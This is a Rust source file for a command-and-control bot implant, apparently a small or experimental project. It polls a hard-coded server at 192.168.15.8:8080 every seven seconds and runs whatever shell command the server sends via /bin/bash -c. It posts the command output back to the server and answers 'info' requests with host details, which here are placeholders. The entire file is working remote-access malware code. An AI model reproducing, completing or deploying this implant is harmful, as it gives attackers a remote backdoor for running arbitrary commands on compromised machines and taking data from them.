use anyhow::Result;
use bytes::Bytes;
use std::io::Cursor;
use std::process::Command;
use c2::{task::Data, InfoRes};
use prost::Message;
use std::time::Duration;

mod c2;
#[tokio::main]
async fn main() -> Result<()> {
    loop {
        poll_job().await?;
        std::thread::sleep(Duration::new(7, 0))
    }
    // Ok(())
}

pub fn serialize_message<T: Message>(req: &T) -> Vec<u8> {
    let mut buf = Vec::new();
    buf.reserve(req.encoded_len());
    req.encode(&mut buf).unwrap();
    buf
}

pub fn deserialize_task(buf: &[u8]) -> Result<c2::Task, prost::DecodeError> {
    c2::Task::decode(&mut Cursor::new(buf))
}

async fn push_task_result(task_result: c2::TaskResult) -> Result<()> {
    println!("push task result start ...");

    let buf = serialize_message(&task_result);
    let url = "http://192.168.15.8:8080/push_task_result";
    let client = reqwest::Client::new();
    let res = client
        .post(url)
        .header("content-type", "application/protobuf")
        .body(buf)
        .send()
        .await?;
    println!("push task result end ...");

    Ok(())
}

async fn poll_job() -> Result<()> {
    println!("poll start ...");
    let url = "http://192.168.15.8:8080/poll";
    let client = reqwest::Client::new();
    let raw = serialize_message(&c2::BotId {
        ip: "1.1.2.3".to_string(),
        mac: "xxx1".to_string(),
        id: "".to_string(),
    });
    let buf = Bytes::copy_from_slice(&raw);
    
    match client
        .post(url)
        .header("content-type", "application/protobuf")
        .body(buf)
        .send()
        .await
    {
        Ok(res) => {
            let res_bytes = res.bytes().await?;
            let task = deserialize_task(&res_bytes).unwrap();

            let mut res = match task.data {
                Some(Data::Info(info)) => {
                    println!("got job info: {:?}", &info);
                    let mut res = c2::TaskResult::default();
                    let info_res = InfoRes {
                        ip: "192.168.15.8".to_string(),
                        mac: "xxx".to_string(),
                        username: "abc".to_string(),
                    };
                    res.data = Some(c2::task_result::Data::Info(info_res));
                    res
                }
                Some(Data::Execute(execute)) => {
                    println!("got job execute: {:?}", execute);
                    let mut res = c2::TaskResult::default();
                    let cmd = execute.cmd;
                    let (status, output1) = match Command::new("/bin/bash")
                        .arg("-c")
                        .arg(&cmd)
                        .output() {
                        Ok(output) => (
                            output.status.success(),
                            String::from_utf8_lossy(&output.stdout).to_string()
                        ),
                        Err(e) => (
                            false,
                            format!("Error executing command: {}", e)
                        )
                    };
                    res.data = Some(c2::task_result::Data::Execute(c2::ExecuteRes {
                        status,
                        data: output1,
                    }));
                    res
                }
                None => {
                    let mut res = c2::TaskResult::default();
                    res.data = None;
                    res
                }
            };

            let bot_id = c2::BotId {
                ip: "1.1.2.3".to_string(),
                mac: "xxx1".to_string(),
                id: "".to_string(),
            };
            res.bot_id = Some(bot_id);
            let _ = push_task_result(res).await?;
            println!("poll over ...");
        }
        Err(e) => {
            println!("Failed to connect to server: {}. Continuing...", e);
        }
    }
    
    Ok(())
}